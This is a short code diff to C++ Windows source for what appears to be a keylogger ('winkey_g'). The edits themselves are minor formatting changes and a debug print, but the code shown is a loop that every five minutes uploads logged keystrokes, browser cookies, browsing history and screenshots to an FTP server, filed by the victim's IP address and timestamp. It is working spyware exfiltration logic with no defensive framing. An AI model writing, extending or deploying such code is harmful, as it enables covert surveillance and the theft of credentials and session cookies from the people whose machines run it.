@@ -36,16 +36,14 @@ int sendFile(const char * pathToFile, const char * targetFtpFile)
 	int err = 0;
 
 	if (hInternet == NULL)
-	{
 		return 1;
-	}
 	HINTERNET hFtpSession = InternetConnect(hInternet, FTP_HOST, INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME, FTP_PASSWORD, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
 	if (hFtpSession == NULL)
 	{
 		InternetCloseHandle(hInternet);
 		return 1;
 	}
-
+	
 	if (!FtpPutFileA(hFtpSession, pathToFile, targetFtpFile, FTP_TRANSFER_TYPE_BINARY, 0))
 		err = 1;
 
@@ -73,13 +71,15 @@ void threadUpload()
 {
 	while (winkey_g.running)
 	{
+		std::cout << "uploading..." << std::endl;
 		std::string targetBase = "/" + winkey_g.targetIP;
 		std::string directoryName = targetBase + "/" + getTime("%d_%m_%Y");
 		std::string TargetPath = directoryName + "/" + getTime("%H_%M_%S");
+	
 		if (uploadKeyboardFile(targetBase, directoryName, TargetPath) == 0)
 		{
 			uploadCookies(TargetPath);
-			uploadHistory(TargetPath);
+		 	uploadHistory(TargetPath);
 			uploadScreenShot(TargetPath);
 		}
 		std::this_thread::sleep_for(std::chrono::seconds(300));
